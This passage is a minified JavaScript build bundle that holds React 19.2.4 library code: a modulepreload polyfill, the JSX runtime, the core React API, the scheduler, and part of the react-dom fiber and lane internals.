(function(){const L=document.createElement("link").relList;if(L&&L.supports&&L.supports("modulepreload"))return;for(const U of document.querySelectorAll('link[rel="modulepreload"]'))y(U);new MutationObserver(U=>{for(const K of U)if(K.type==="childList")for(const ue of K.addedNodes)ue.tagName==="LINK"&&ue.rel==="modulepreload"&&y(ue)}).observe(document,{childList:!0,subtree:!0});function G(U){const K={};return U.integrity&&(K.integrity=U.integrity),U.referrerPolicy&&(K.referrerPolicy=U.referrerPolicy),U.crossOrigin==="use-credentials"?K.credentials="include":U.crossOrigin==="anonymous"?K.credentials="omit":K.credentials="same-origin",K}function y(U){if(U.ep)return;U.ep=!0;const K=G(U);fetch(U.href,K)}})();var ss={exports:{}},An={};var pd;function tm(){if(pd)return An;pd=1;var z=Symbol.for("react.transitional.element"),L=Symbol.for("react.fragment");function G(y,U,K){var ue=null;if(K!==void 0&&(ue=""+K),U.key!==void 0&&(ue=""+U.key),"key"in U){K={};for(var Ae in U)Ae!=="key"&&(K[Ae]=U[Ae])}else K=U;return U=K.ref,{$$typeof:z,type:y,key:ue,ref:U!==void 0?U:null,props:K}}return An.Fragment=L,An.jsx=G,An.jsxs=G,An}var Sd;function lm(){return Sd||(Sd=1,ss.exports=tm()),ss.exports}var v=lm(),fs={exports:{}},k={};var bd;function am(){if(bd)return k;bd=1;var z=Symbol.for("react.transitional.element"),L=Symbol.for("react.portal"),G=Symbol.for("react.fragment"),y=Symbol.for("react.strict_mode"),U=Symbol.for("react.profiler"),K=Symbol.for("react.consumer"),ue=Symbol.for("react.context"),Ae=Symbol.for("react.forward_ref"),M=Symbol.for("react.suspense"),E=Symbol.for("react.memo"),P=Symbol.for("react.lazy"),j=Symbol.for("react.activity"),he=Symbol.iterator;function ke(o){return o===null||typeof o!="object"?null:(o=he&&o[he]||o["@@iterator"],typeof o=="function"?o:null)}var Ge={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},H=Object.assign,R={};function X(o,A,C){this.props=o,this.context=A,this.refs=R,this.updater=C||Ge}X.prototype.isReactComponent={},X.prototype.setState=function(o,A){if(typeof o!="object"&&typeof o!="function"&&o!=null)throw Error("takes an object of state variables to update or a function which returns an object of state variables.");this.updater.enqueueSetState(this,o,A,"setState")},X.prototype.forceUpdate=function(o){this.updater.enqueueForceUpdate(this,o,"forceUpdate")};function x(){}x.prototype=X.prototype;function Ee(o,A,C){this.props=o,this.context=A,this.refs=R,this.updater=C||Ge}var we=Ee.prototype=new x;we.constructor=Ee,H(we,X.prototype),we.isPureReactComponent=!0;var et=Array.isArray;function ae(){}var Y={H:null,A:null,T:null,S:null},ze=Object.prototype.hasOwnProperty;function ge(o,A,C){var D=C.ref;return{$$typeof:z,type:o,key:A,ref:D!==void 0?D:null,props:C}}function Ht(o,A){return ge(o.type,A,o.props)}function rt(o){return typeof o=="object"&&o!==null&&o.$$typeof===z}function Xe(o){var A={"=":"=0",":":"=2"};return"$"+o.replace(/[=:]/g,function(C){return A[C]})}var zl=/\/+/g;function Rt(o,A){return typeof o=="object"&&o!==null&&o.key!=null?Xe(""+o.key):A.toString(36)}function Et(o){switch(o.status){case"fulfilled":return o.value;case"rejected":throw o.reason;default:switch(typeof o.status=="string"?o.then(ae,ae):(o.status="pending",o.then(function(A){o.status==="pending"&&(o.status="fulfilled",o.value=A)},function(A){o.status==="pending"&&(o.status="rejected",o.reason=A)})),o.status){case"fulfilled":return o.value;case"rejected":throw o.reason}}throw o}function S(o,A,C,D,Q){var J=typeof o;(J==="undefined"||J==="boolean")&&(o=null);var ie=!1;if(o===null)ie=!0;else switch(J){case"bigint":case"string":case"number":ie=!0;break;case"object":switch(o.$$typeof){case z:case L:ie=!0;break;case P:return ie=o._init,S(ie(o._payload),A,C,D,Q)}}if(ie)return Q=Q(o),ie=D===""?"."+Rt(o,0):D,et(Q)?(C="",ie!=null&&(C=ie.replace(zl,"$&/")+"/"),S(Q,A,C,"",function(Da){return Da})):Q!=null&&(rt(Q)&&(Q=Ht(Q,C+(Q.key==null||o&&o.key===Q.key?"":(""+Q.key).replace(zl,"$&/")+"/")+ie)),A.push(Q)),1;ie=0;var Ve=D===""?".":D+":";if(et(o))for(var Oe=0;Oe<o.length;Oe++)D=o[Oe],J=Ve+Rt(D,Oe),ie+=S(D,A,C,J,Q);else if(Oe=ke(o),typeof Oe=="function")for(o=Oe.call(o),Oe=0;!(D=o.next()).done;)D=D.value,J=Ve+Rt(D,Oe++),ie+=S(D,A,C,J,Q);else if(J==="object"){if(typeof o.then=="function")return S(Et(o),A,C,D,Q);throw A=String(o),Error("Objects are not valid as a React child (found: "+(A==="[object Object]"?"object with keys {"+Object.keys(o).join(", ")+"}":A)+"). If you meant to render a collection of children, use an array instead.")}return ie}function O(o,A,C){if(o==null)return o;var D=[],Q=0;return S(o,D,"","",function(J){return A.call(C,J,Q++)}),D}function q(o){if(o._status===-1){var A=o._result;A=A(),A.then(function(C){(o._status===0||o._status===-1)&&(o._status=1,o._result=C)},function(C){(o._status===0||o._status===-1)&&(o._status=2,o._result=C)}),o._status===-1&&(o._status=0,o._result=A)}if(o._status===1)return o._result.default;throw o._result}var fe=typeof reportError=="function"?reportError:function(o){if(typeof window=="object"&&typeof window.ErrorEvent=="function"){var A=new window.ErrorEvent("error",{bubbles:!0,cancelable:!0,message:typeof o=="object"&&o!==null&&typeof o.message=="string"?String(o.message):String(o),error:o});if(!window.dispatchEvent(A))return}else if(typeof process=="object"&&typeof process.emit=="function"){process.emit("uncaughtException",o);return}console.error(o)},ye={map:O,forEach:function(o,A,C){O(o,function(){A.apply(this,arguments)},C)},count:function(o){var A=0;return O(o,function(){A++}),A},toArray:function(o){return O(o,function(A){return A})||[]},only:function(o){if(!rt(o))throw Error("React.Children.only expected to receive a single React element child.");return o}};return k.Activity=j,k.Children=ye,k.Component=X,k.Fragment=G,k.Profiler=U,k.PureComponent=Ee,k.StrictMode=y,k.Suspense=M,k.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE=Y,k.__COMPILER_RUNTIME={__proto__:null,c:function(o){return Y.H.useMemoCache(o)}},k.cache=function(o){return function(){return o.apply(null,arguments)}},k.cacheSignal=function(){return null},k.cloneElement=function(o,A,C){if(o==null)throw Error("The argument must be a React element, but you passed "+o+".");var D=H({},o.props),Q=o.key;if(A!=null)for(J in A.key!==void 0&&(Q=""+A.key),A)!ze.call(A,J)||J==="key"||J==="__self"||J==="__source"||J==="ref"&&A.ref===void 0||(D[J]=A[J]);var J=arguments.length-2;if(J===1)D.children=C;else if(1<J){for(var ie=Array(J),Ve=0;Ve<J;Ve++)ie[Ve]=arguments[Ve+2];D.children=ie}return ge(o.type,Q,D)},k.createContext=function(o){return o={$$typeof:ue,_currentValue:o,_currentValue2:o,_threadCount:0,Provider:null,Consumer:null},o.Provider=o,o.Consumer={$$typeof:K,_context:o},o},k.createElement=function(o,A,C){var D,Q={},J=null;if(A!=null)for(D in A.key!==void 0&&(J=""+A.key),A)ze.call(A,D)&&D!=="key"&&D!=="__self"&&D!=="__source"&&(Q[D]=A[D]);var ie=arguments.length-2;if(ie===1)Q.children=C;else if(1<ie){for(var Ve=Array(ie),Oe=0;Oe<ie;Oe++)Ve[Oe]=arguments[Oe+2];Q.children=Ve}if(o&&o.defaultProps)for(D in ie=o.defaultProps,ie)Q[D]===void 0&&(Q[D]=ie[D]);return ge(o,J,Q)},k.createRef=function(){return{current:null}},k.forwardRef=function(o){return{$$typeof:Ae,render:o}},k.isValidElement=rt,k.lazy=function(o){return{$$typeof:P,_payload:{_status:-1,_result:o},_init:q}},k.memo=function(o,A){return{$$typeof:E,type:o,compare:A===void 0?null:A}},k.startTransition=function(o){var A=Y.T,C={};Y.T=C;try{var D=o(),Q=Y.S;Q!==null&&Q(C,D),typeof D=="object"&&D!==null&&typeof D.then=="function"&&D.then(ae,fe)}catch(J){fe(J)}finally{A!==null&&C.types!==null&&(A.types=C.types),Y.T=A}},k.unstable_useCacheRefresh=function(){return Y.H.useCacheRefresh()},k.use=function(o){return Y.H.use(o)},k.useActionState=function(o,A,C){return Y.H.useActionState(o,A,C)},k.useCallback=function(o,A){return Y.H.useCallback(o,A)},k.useContext=function(o){return Y.H.useContext(o)},k.useDebugValue=function(){},k.useDeferredValue=function(o,A){return Y.H.useDeferredValue(o,A)},k.useEffect=function(o,A){return Y.H.useEffect(o,A)},k.useEffectEvent=function(o){return Y.H.useEffectEvent(o)},k.useId=function(){return Y.H.useId()},k.useImperativeHandle=function(o,A,C){return Y.H.useImperativeHandle(o,A,C)},k.useInsertionEffect=function(o,A){return Y.H.useInsertionEffect(o,A)},k.useLayoutEffect=function(o,A){return Y.H.useLayoutEffect(o,A)},k.useMemo=function(o,A){return Y.H.useMemo(o,A)},k.useOptimistic=function(o,A){return Y.H.useOptimistic(o,A)},k.useReducer=function(o,A,C){return Y.H.useReducer(o,A,C)},k.useRef=function(o){return Y.H.useRef(o)},k.useState=function(o){return Y.H.useState(o)},k.useSyncExternalStore=function(o,A,C){return Y.H.useSyncExternalStore(o,A,C)},k.useTransition=function(){return Y.H.useTransition()},k.version="19.2.4",k}var Td;function ys(){return Td||(Td=1,fs.exports=am()),fs.exports}var Dt=ys(),os={exports:{}},En={},rs={exports:{}},ds={};var Ad;function nm(){return Ad||(Ad=1,(function(z){function L(S,O){var q=S.length;S.push(O);e:for(;0<q;){var fe=q-1>>>1,ye=S[fe];if(0<U(ye,O))S[fe]=O,S[q]=ye,q=fe;else break e}}function G(S){return S.length===0?null:S[0]}function y(S){if(S.length===0)return null;var O=S[0],q=S.pop();if(q!==O){S[0]=q;e:for(var fe=0,ye=S.length,o=ye>>>1;fe<o;){var A=2*(fe+1)-1,C=S[A],D=A+1,Q=S[D];if(0>U(C,q))D<ye&&0>U(Q,C)?(S[fe]=Q,S[D]=q,fe=D):(S[fe]=C,S[A]=q,fe=A);else if(D<ye&&0>U(Q,q))S[fe]=Q,S[D]=q,fe=D;else break e}}return O}function U(S,O){var q=S.sortIndex-O.sortIndex;return q!==0?q:S.id-O.id}if(z.unstable_now=void 0,typeof performance=="object"&&typeof performance.now=="function"){var K=performance;z.unstable_now=function(){return K.now()}}else{var ue=Date,Ae=ue.now();z.unstable_now=function(){return ue.now()-Ae}}var M=[],E=[],P=1,j=null,he=3,ke=!1,Ge=!1,H=!1,R=!1,X=typeof setTimeout=="function"?setTimeout:null,x=typeof clearTimeout=="function"?clearTimeout:null,Ee=typeof setImmediate<"u"?setImmediate:null;function we(S){for(var O=G(E);O!==null;){if(O.callback===null)y(E);else if(O.startTime<=S)y(E),O.sortIndex=O.expirationTime,L(M,O);else break;O=G(E)}}function et(S){if(H=!1,we(S),!Ge)if(G(M)!==null)Ge=!0,ae||(ae=!0,Xe());else{var O=G(E);O!==null&&Et(et,O.startTime-S)}}var ae=!1,Y=-1,ze=5,ge=-1;function Ht(){return R?!0:!(z.unstable_now()-ge<ze)}function rt(){if(R=!1,ae){var S=z.unstable_now();ge=S;var O=!0;try{e:{Ge=!1,H&&(H=!1,x(Y),Y=-1),ke=!0;var q=he;try{t:{for(we(S),j=G(M);j!==null&&!(j.expirationTime>S&&Ht());){var fe=j.callback;if(typeof fe=="function"){j.callback=null,he=j.priorityLevel;var ye=fe(j.expirationTime<=S);if(S=z.unstable_now(),typeof ye=="function"){j.callback=ye,we(S),O=!0;break t}j===G(M)&&y(M),we(S)}else y(M);j=G(M)}if(j!==null)O=!0;else{var o=G(E);o!==null&&Et(et,o.startTime-S),O=!1}}break e}finally{j=null,he=q,ke=!1}O=void 0}}finally{O?Xe():ae=!1}}}var Xe;if(typeof Ee=="function")Xe=function(){Ee(rt)};else if(typeof MessageChannel<"u"){var zl=new MessageChannel,Rt=zl.port2;zl.port1.onmessage=rt,Xe=function(){Rt.postMessage(null)}}else Xe=function(){X(rt,0)};function Et(S,O){Y=X(function(){S(z.unstable_now())},O)}z.unstable_IdlePriority=5,z.unstable_ImmediatePriority=1,z.unstable_LowPriority=4,z.unstable_NormalPriority=3,z.unstable_Profiling=null,z.unstable_UserBlockingPriority=2,z.unstable_cancelCallback=function(S){S.callback=null},z.unstable_forceFrameRate=function(S){0>S||125<S?console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"):ze=0<S?Math.floor(1e3/S):5},z.unstable_getCurrentPriorityLevel=function(){return he},z.unstable_next=function(S){switch(he){case 1:case 2:case 3:var O=3;break;default:O=he}var q=he;he=O;try{return S()}finally{he=q}},z.unstable_requestPaint=function(){R=!0},z.unstable_runWithPriority=function(S,O){switch(S){case 1:case 2:case 3:case 4:case 5:break;default:S=3}var q=he;he=S;try{return O()}finally{he=q}},z.unstable_scheduleCallback=function(S,O,q){var fe=z.unstable_now();switch(typeof q=="object"&&q!==null?(q=q.delay,q=typeof q=="number"&&0<q?fe+q:fe):q=fe,S){case 1:var ye=-1;break;case 2:ye=250;break;case 5:ye=1073741823;break;case 4:ye=1e4;break;default:ye=5e3}return ye=q+ye,S={id:P++,callback:O,priorityLevel:S,startTime:q,expirationTime:ye,sortIndex:-1},q>fe?(S.sortIndex=q,L(E,S),G(M)===null&&S===G(E)&&(H?(x(Y),Y=-1):H=!0,Et(et,q-fe))):(S.sortIndex=ye,L(M,S),Ge||ke||(Ge=!0,ae||(ae=!0,Xe()))),S},z.unstable_shouldYield=Ht,z.unstable_wrapCallback=function(S){var O=he;return function(){var q=he;he=O;try{return S.apply(this,arguments)}finally{he=q}}}})(ds)),ds}var Ed;function um(){return Ed||(Ed=1,rs.exports=nm()),rs.exports}var hs={exports:{}},Qe={};var zd;function im(){if(zd)return Qe;zd=1;var z=ys();function L(M){var E="https://react.dev/errors/"+M;if(1<arguments.length){E+="?args[]="+encodeURIComponent(arguments[1]);for(var P=2;P<arguments.length;P++)E+="&args[]="+encodeURIComponent(arguments[P])}return"Minified React error #"+M+"; visit "+E+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}function G(){}var y={d:{f:G,r:function(){throw Error(L(522))},D:G,C:G,L:G,m:G,X:G,S:G,M:G},p:0,findDOMNode:null},U=Symbol.for("react.portal");function K(M,E,P){var j=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:U,key:j==null?null:""+j,children:M,containerInfo:E,implementation:P}}var ue=z.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE;function Ae(M,E){if(M==="font")return"";if(typeof E=="string")return E==="use-credentials"?E:""}return Qe.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE=y,Qe.createPortal=function(M,E){var P=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!E||E.nodeType!==1&&E.nodeType!==9&&E.nodeType!==11)throw Error(L(299));return K(M,E,null,P)},Qe.flushSync=function(M){var E=ue.T,P=y.p;try{if(ue.T=null,y.p=2,M)return M()}finally{ue.T=E,y.p=P,y.d.f()}},Qe.preconnect=function(M,E){typeof M=="string"&&(E?(E=E.crossOrigin,E=typeof E=="string"?E==="use-credentials"?E:"":void 0):E=null,y.d.C(M,E))},Qe.prefetchDNS=function(M){typeof M=="string"&&y.d.D(M)},Qe.preinit=function(M,E){if(typeof M=="string"&&E&&typeof E.as=="string"){var P=E.as,j=Ae(P,E.crossOrigin),he=typeof E.integrity=="string"?E.integrity:void 0,ke=typeof E.fetchPriority=="string"?E.fetchPriority:void 0;P==="style"?y.d.S(M,typeof E.precedence=="string"?E.precedence:void 0,{crossOrigin:j,integrity:he,fetchPriority:ke}):P==="script"&&y.d.X(M,{crossOrigin:j,integrity:he,fetchPriority:ke,nonce:typeof E.nonce=="string"?E.nonce:void 0})}},Qe.preinitModule=function(M,E){if(typeof M=="string")if(typeof E=="object"&&E!==null){if(E.as==null||E.as==="script"){var P=Ae(E.as,E.crossOrigin);y.d.M(M,{crossOrigin:P,integrity:typeof E.integrity=="string"?E.integrity:void 0,nonce:typeof E.nonce=="string"?E.nonce:void 0})}}else E==null&&y.d.M(M)},Qe.preload=function(M,E){if(typeof M=="string"&&typeof E=="object"&&E!==null&&typeof E.as=="string"){var P=E.as,j=Ae(P,E.crossOrigin);y.d.L(M,P,{crossOrigin:j,integrity:typeof E.integrity=="string"?E.integrity:void 0,nonce:typeof E.nonce=="string"?E.nonce:void 0,type:typeof E.type=="string"?E.type:void 0,fetchPriority:typeof E.fetchPriority=="string"?E.fetchPriority:void 0,referrerPolicy:typeof E.referrerPolicy=="string"?E.referrerPolicy:void 0,imageSrcSet:typeof E.imageSrcSet=="string"?E.imageSrcSet:void 0,imageSizes:typeof E.imageSizes=="string"?E.imageSizes:void 0,media:typeof E.media=="string"?E.media:void 0})}},Qe.preloadModule=function(M,E){if(typeof M=="string")if(E){var P=Ae(E.as,E.crossOrigin);y.d.m(M,{as:typeof E.as=="string"&&E.as!=="script"?E.as:void 0,crossOrigin:P,integrity:typeof E.integrity=="string"?E.integrity:void 0})}else y.d.m(M)},Qe.requestFormReset=function(M){y.d.r(M)},Qe.unstable_batchedUpdates=function(M,E){return M(E)},Qe.useFormState=function(M,E,P){return ue.H.useFormState(M,E,P)},Qe.useFormStatus=function(){return ue.H.useHostTransitionStatus()},Qe.version="19.2.4",Qe}var Od;function cm(){if(Od)return hs.exports;Od=1;function z(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(z)}catch(L){console.error(L)}}return z(),hs.exports=im(),hs.exports}var Cd;function sm(){if(Cd)return En;Cd=1;var z=um(),L=ys(),G=cm();function y(e){var t="https://react.dev/errors/"+e;if(1<arguments.length){t+="?args[]="+encodeURIComponent(arguments[1]);for(var l=2;l<arguments.length;l++)t+="&args[]="+encodeURIComponent(arguments[l])}return"Minified React error #"+e+"; visit "+t+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}function U(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11)}function K(e){var t=e,l=e;if(e.alternate)for(;t.return;)t=t.return;else{e=t;do t=e,(t.flags&4098)!==0&&(l=t.return),e=t.return;while(e)}return t.tag===3?l:null}function ue(e){if(e.tag===13){var t=e.memoizedState;if(t===null&&(e=e.alternate,e!==null&&(t=e.memoizedState)),t!==null)return t.dehydrated}return null}function Ae(e){if(e.tag===31){var t=e.memoizedState;if(t===null&&(e=e.alternate,e!==null&&(t=e.memoizedState)),t!==null)return t.dehydrated}return null}function M(e){if(K(e)!==e)throw Error(y(188))}function E(e){var t=e.alternate;if(!t){if(t=K(e),t===null)throw Error(y(188));return t!==e?null:e}for(var l=e,a=t;;){var n=l.return;if(n===null)break;var u=n.alternate;if(u===null){if(a=n.return,a!==null){l=a;continue}break}if(n.child===u.child){for(u=n.child;u;){if(u===l)return M(n),e;if(u===a)return M(n),t;u=u.sibling}throw Error(y(188))}if(l.return!==a.return)l=n,a=u;else{for(var i=!1,c=n.child;c;){if(c===l){i=!0,l=n,a=u;break}if(c===a){i=!0,a=n,l=u;break}c=c.sibling}if(!i){for(c=u.child;c;){if(c===l){i=!0,l=u,a=n;break}if(c===a){i=!0,a=u,l=n;break}c=c.sibling}if(!i)throw Error(y(189))}}if(l.alternate!==a)throw Error(y(190))}if(l.tag!==3)throw Error(y(188));return l.stateNode.current===l?e:t}function P(e){var t=e.tag;if(t===5||t===26||t===27||t===6)return e;for(e=e.child;e!==null;){if(t=P(e),t!==null)return t;e=e.sibling}return null}var j=Object.assign,he=Symbol.for("react.element"),ke=Symbol.for("react.transitional.element"),Ge=Symbol.for("react.portal"),H=Symbol.for("react.fragment"),R=Symbol.for("react.strict_mode"),X=Symbol.for("react.profiler"),x=Symbol.for("react.consumer"),Ee=Symbol.for("react.context"),we=Symbol.for("react.forward_ref"),et=Symbol.for("react.suspense"),ae=Symbol.for("react.suspense_list"),Y=Symbol.for("react.memo"),ze=Symbol.for("react.lazy"),ge=Symbol.for("react.activity"),Ht=Symbol.for("react.memo_cache_sentinel"),rt=Symbol.iterator;function Xe(e){return e===null||typeof e!="object"?null:(e=rt&&e[rt]||e["@@iterator"],typeof e=="function"?e:null)}var zl=Symbol.for("react.client.reference");function Rt(e){if(e==null)return null;if(typeof e=="function")return e.$$typeof===zl?null:e.displayName||e.name||null;if(typeof e=="string")return e;switch(e){case H:return"Fragment";case X:return"Profiler";case R:return"StrictMode";case et:return"Suspense";case ae:return"SuspenseList";case ge:return"Activity"}if(typeof e=="object")switch(e.$$typeof){case Ge:return"Portal";case Ee:return e.displayName||"Context";case x:return(e._context.displayName||"Context")+".Consumer";case we:var t=e.render;return e=e.displayName,e||(e=t.displayName||t.name||"",e=e!==""?"ForwardRef("+e+")":"ForwardRef"),e;case Y:return t=e.displayName||null,t!==null?t:Rt(e.type)||"Memo";case ze:t=e._payload,e=e._init;try{return Rt(e(t))}catch{}}return null}var Et=Array.isArray,S=L.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE,O=G.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE,q={pending:!1,data:null,method:null,action:null},fe=[],ye=-1;function o(e){return{current:e}}function A(e){0>ye||(e.current=fe[ye],fe[ye]=null,ye--)}function C(e,t){ye++,fe[ye]=e.current,e.current=t}var D=o(null),Q=o(null),J=o(null),ie=o(null);function Ve(e,t){switch(C(J,t),C(Q,e),C(D,null),t.nodeType){case 9:case 11:e=(e=t.documentElement)&&(e=e.namespaceURI)?kr(e):0;break;default:if(e=t.tagName,t=t.namespaceURI)t=kr(t),e=Gr(t,e);else switch(e){case"svg":e=1;break;case"math":e=2;break;default:e=0}}A(D),C(D,e)}function Oe(){A(D),A(Q),A(J)}function Da(e){e.memoizedState!==null&&C(ie,e);var t=D.current,l=Gr(t,e.type);t!==l&&(C(Q,e),C(D,l))}function On(e){Q.current===e&&(A(D),A(Q)),ie.current===e&&(A(ie),pn._currentValue=q)}var Qu,ms;function Ol(e){if(Qu===void 0)try{throw Error()}catch(l){var t=l.stack.trim().match(/\n( *(at )?)/);Qu=t&&t[1]||"",ms=-1<l.stack.indexOf(`
    at`)?" (<anonymous>)":-1<l.stack.indexOf("@")?"@unknown:0:0":""}return`
`+Qu+e+ms}var Vu=!1;function Zu(e,t){if(!e||Vu)return"";Vu=!0;var l=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{var a={DetermineComponentFrameRoot:function(){try{if(t){var T=function(){throw Error()};if(Object.defineProperty(T.prototype,"props",{set:function(){throw Error()}}),typeof Reflect=="object"&&Reflect.construct){try{Reflect.construct(T,[])}catch(g){var m=g}Reflect.construct(e,[],T)}else{try{T.call()}catch(g){m=g}e.call(T.prototype)}}else{try{throw Error()}catch(g){m=g}(T=e())&&typeof T.catch=="function"&&T.catch(function(){})}}catch(g){if(g&&m&&typeof g.stack=="string")return[g.stack,m.stack]}return[null,null]}};a.DetermineComponentFrameRoot.displayName="DetermineComponentFrameRoot";var n=Object.getOwnPropertyDescriptor(a.DetermineComponentFrameRoot,"name");n&&n.configurable&&Object.defineProperty(a.DetermineComponentFrameRoot,"name",{value:"DetermineComponentFrameRoot"});var u=a.DetermineComponentFrameRoot(),i=u[0],c=u[1];if(i&&c){var s=i.split(`
`),h=c.split(`
`);for(n=a=0;a<s.length&&!s[a].includes("DetermineComponentFrameRoot");)a++;for(;n<h.length&&!h[n].includes("DetermineComponentFrameRoot");)n++;if(a===s.length||n===h.length)for(a=s.length-1,n=h.length-1;1<=a&&0<=n&&s[a]!==h[n];)n--;for(;1<=a&&0<=n;a--,n--)if(s[a]!==h[n]){if(a!==1||n!==1)do if(a--,n--,0>n||s[a]!==h[n]){var p=`
`+s[a].replace(" at new "," at ");return e.displayName&&p.includes("<anonymous>")&&(p=p.replace("<anonymous>",e.displayName)),p}while(1<=a&&0<=n);break}}}finally{Vu=!1,Error.prepareStackTrace=l}return(l=e?e.displayName||e.name:"")?Ol(l):""}function xd(e,t){switch(e.tag){case 26:case 27:case 5:return Ol(e.type);case 16:return Ol("Lazy");case 13:return e.child!==t&&t!==null?Ol("Suspense Fallback"):Ol("Suspense");case 19:return Ol("SuspenseList");case 0:case 15:return Zu(e.type,!1);case 11:return Zu(e.type.render,!1);case 1:return Zu(e.type,!0);case 31:return Ol("Activity");default:return""}}function gs(e){try{var t="",l=null;do t+=xd(e,l),l=e,e=e.return;while(e);return t}catch(a){return`
Error generating stack: `+a.message+`
`+a.stack}}var Ku=Object.prototype.hasOwnProperty,Ju=z.unstable_scheduleCallback,Wu=z.unstable_cancelCallback,Ud=z.unstable_shouldYield,Rd=z.unstable_requestPaint,tt=z.unstable_now,wd=z.unstable_getCurrentPriorityLevel,vs=z.unstable_ImmediatePriority,ps=z.unstable_UserBlockingPriority,Cn=z.unstable_NormalPriority,jd=z.unstable_LowPriority,Ss=z.unstable_IdlePriority,Bd=z.log,Yd=z.unstable_setDisableYieldValue,Ha=null,lt=null;function Pt(e){if(typeof Bd=="function"&&Yd(e),lt&&typeof lt.setStrictMode=="function")try{lt.setStrictMode(Ha,e)}catch{}}var at=Math.clz32?Math.clz32:kd,qd=Math.log,Ld=Math.LN2;function kd(e){return e>>>=0,e===0?32:31-(qd(e)/Ld|0)|0}var _n=256,Dn=262144,Hn=4194304;function Cl(e){var t=e&42;if(t!==0)return t;switch(e&-e){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:return 64;case 128:return 128;case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:return e&261888;case 262144:case 524288:case 1048576:case 2097152:return e&3932160;case 4194304:case 8388608:case 16777216:case 33554432:return e&62914560;case 67108864:return 67108864;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 0;default:return e}}function Nn(e,t,l){var a=e.pendingLanes;if(a===0)return 0;var n=0,u=e.suspendedLanes,i=e.pingedLanes;e=e.warmLanes;var c=a&134217727;return c!==0?(a=c&~u,a!==0?n=Cl(a):(i&=c,i!==0?n=Cl(i):l||(l=c&~e,l!==0&&(n=Cl(l))))):(c=a&~u,c!==0?n=Cl(c):i!==0?n=Cl(i):l||(l=a&~e,l!==0&&(n=Cl(l)))),n===0?0:t!==0&&t!==n&&(t&u)===0&&(u=n&-n,l=t&-t,u>=l||u===32&&(l&4194048)!==0)?t:n}function Na(e,t){return(e.pendingLanes&~(e.suspendedLanes&~e.pingedLanes)&t)===0}function Gd(e,t){switch(e){case 1:case 2:case 4:case 8:case 64:return t+250;case 16:case 32:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return t+5e3;case 4194304:case 8388608:case 16777216:case 33554432:return-1;case 67108864:case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function bs(){var e=Hn;return Hn<<=1,(Hn&62914560)===0&&(Hn=4194304),e}function Fu(e){for(var t=[],l=0;31>l;l++)t.push(e);return t}function Ma(e,t){e.pendingLanes|=t,t!==268435456&&(e.suspendedLanes=0,e.pingedLanes=0,e.warmLanes=0)}function Xd(e,t,l,a,n,u){var i=e.pendingLanes;e.pendingLanes=l,e.suspendedLanes=0,e.pingedLanes=0,e.warmLanes=0,e.expiredLanes&=l,e.entangledLanes&=l,e.errorRecoveryDisabledLanes&=l,e.shellSuspendCounter=0;var c=e.entanglements,s=e.expirationTimes,h=e.hiddenUpdates;for(l=i&~l;0<l;){var p=31-at(l),T=1<<p;c[p]=0,s[p]=-1;var m=h[p];if(m!==null)for(h[p]=null,p=0;p<m.length;p++){var g=m[p];g!==null&&(g.lane&=-536870913)}l&=~T}a!==0&&Ts(e,a,0),u!==0&&n===0&&e.tag!==0&&(e.suspendedLanes|=u&~(i&~t))}function Ts(e,t,l){e.pendingLanes|=t,e.suspendedLanes&=~t;var a=31-at(t);e.entangledLanes|=t,e.entanglements[a]=e.entanglements[a]|1073741824|l&261930}function As(e,t){var l=e.entangledLanes|=t;for(e=e.entanglements;l;){var a=31-at(l),n=1<<a;n&t|e[a]&t&&(e[a]|=t),l&=~n}}function Es(e,t){var l=t&-t;return l=(l&42)!==0?1:$u(l),(l&(e.suspendedLanes|t))!==0?0:l}function $u(e){switch(e){case 2:e=1;break;case 8:e=4;break;case 32:e=16;break;case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:e=128;break;case 268435456:e=134217728;break;default:e=0}return e}function Iu(e){return e&=-e,2<e?8<e?(e&134217727)!==0?32:268435456:8:2}function zs(){var e=O.p;return e!==0?e:(e=window.event,e===void 0?32:rd(e.type))}function Os(e,t){var l=O.p;try{return O.p=e,t()}finally{O.p=l}}var el=Math.random().toString(36).slice(2),je="__reactFiber$"+el,Ke="__reactProps$"+el,Ql="__reactContainer$"+el,Pu="__reactEvents$"+el,Qd="__reactListeners$"+el,Vd="__reactHandles$"+el,Cs="__reactResources$"+el,xa="__reactMarker$"+el;function ei(e){delete e[je],delete e[Ke],delete e[Pu],delete e[Qd],delete e[Vd]}function Vl(e){var t=e[je];if(t)return t;for(var l=e.parentNode;l;){if(t=l[Ql]||l[je]){if(l=t.alternate,t.child!==null||l!==null&&l.child!==null)for(e=Wr(e);e!==null;){if(l=e[je])return l;e=Wr(e)}return t}e=l,l=e.parentNode}return null}function Zl(e){if(e=e[je]||e[Ql]){var t=e.tag;if(t===5||t===6||t===13||t===31||t===26||t===27||t===3)return 